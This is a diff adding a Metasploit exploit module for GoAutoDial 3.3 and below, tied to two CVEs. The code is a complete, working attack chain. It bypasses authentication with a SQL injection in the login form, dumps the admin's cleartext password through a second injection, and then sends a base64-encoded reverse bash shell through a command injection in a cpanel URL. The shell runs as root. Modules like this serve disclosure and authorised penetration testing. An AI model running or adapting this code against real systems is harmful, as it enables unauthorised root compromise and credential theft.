@@ -1,0 +1,141 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "GoAutoDial 3.3 Authentication Bypass / Command Injection",
+      'Description'    => %q{
+          This module exploits a SQL injection flaw in the login functionality for GoAutoDial version 3.3-1406088000 and below, and attempts to perform command injection. This also attempts to retrieve the admin user details, including the cleartext password stored in the underlying database. Command injection will be performed with root privileges. The default pre-packaged ISO builds are available from goautodial.org. Currently, the hardcoded command injection payload is an encoded reverse-tcp bash one-liner and the handler should be setup to receive it appropriately.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Chris McCurley',  # Discovery & Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2015-2843'],
+          ['CVE', '2015-2845']
+        ],
+      'Platform'       => %w{unix},
+      'Arch'            => ARCH_CMD,
+      'Targets'        => [ ['Automatic', {} ] ],
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },
+      'DefaultTarget'  => 0,
+      'Privileged'     => false,
+      'DisclosureDate' => 'Apr 21 2015'))
+
+    register_options(
+      [
+        OptPort.new('RPORT', [true, 'The target port', 443]),
+        OptBool.new('SSL', [false, 'Use SSL', true]),
+        OptString.new('TARGETURI', [true, 'The base path', '/'])
+      ])
+  end
+
+
+  def check
+    res = check_version()
+    if res and res.body =~ /1421902800/
+      return Exploit::CheckCode::Safe
+    else
+      return Exploit::CheckCode::Vulnerable
+    end
+  end
+
+  def check_version()
+    uri = target_uri.path
+
+    send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(uri, 'changelog.txt'),
+      'headers'   => {
+        'User-Agent' => 'Mozilla/5.0',
+        'Accept-Encoding' => 'identity'
+      }
+    })
+  end
+
+  def sqli_auth_bypass()
+    uri = target_uri.path
+
+    send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(uri, 'index.php', 'go_login', 'validate_credentials'),
+      'headers'   => {
+        'User-Agent' => 'Mozilla/5.0',
+        'Accept-Encoding' => 'identity'
+      },
+      'vars_post' => {
+        'user_name'   => 'admin',
+        'user_pass'   => '\'%20or%20\'1\'%3D\'1'
+      }
+    })
+  end
+
+  def sqli_admin_pass(cookies)
+   uri = target_uri.path
+
+   send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(uri, 'index.php', 'go_site', 'go_get_user_info', '\'%20OR%20active=\'Y'),
+      'headers'   => {
+        'User-Agent' => 'Mozilla/5.0',
+        'Accept-Encoding' => 'identity',
+        'Cookie' => cookies
+      }
+    })
+  end
+
+  #
+  # Run the actual exploit
+  #
+  def execute_command()
+
+    encoded = Rex::Text.encode_base64("#{payload.encoded}")
+    params = "||%20bash%20-c%20\"eval%20`echo%20-n%20" + encoded + "%20|%20base64%20--decode`\""
+    uri = target_uri.path
+
+    send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(uri, 'index.php', 'go_site', 'cpanel', params),
+      'headers'   => {
+        'User-Agent' => 'Mozilla/5.0',
+        'Accept-Encoding' => 'identity',
+        'Cookie' => @cookie
+      }
+    })
+  end
+
+
+  def exploit()
+    print_status("#{rhost}:#{rport} - Trying SQL injection...")
+    res1 = sqli_auth_bypass()
+
+    if res1 && res1.code == 200
+      print_good('Authentication Bypass (SQLi) was successful')
+    else
+      print_error('Error: Run \'check\' command to identify whether the auth bypass has been fixed')
+    end
+
+    @cookie = res1.get_cookies
+    print_status("#{rhost}:#{rport} - Dumping admin password...")
+    res = sqli_admin_pass(@cookie)
+
+    if res
+      print_good(res.body)
+    else
+      print_error('Error: No creds returned, possible mitigations are in place.')
+    end
+    print_status("#{rhost}:#{rport} - Sending payload...waiting for connection")
+
+    execute_command()
+  end
+end
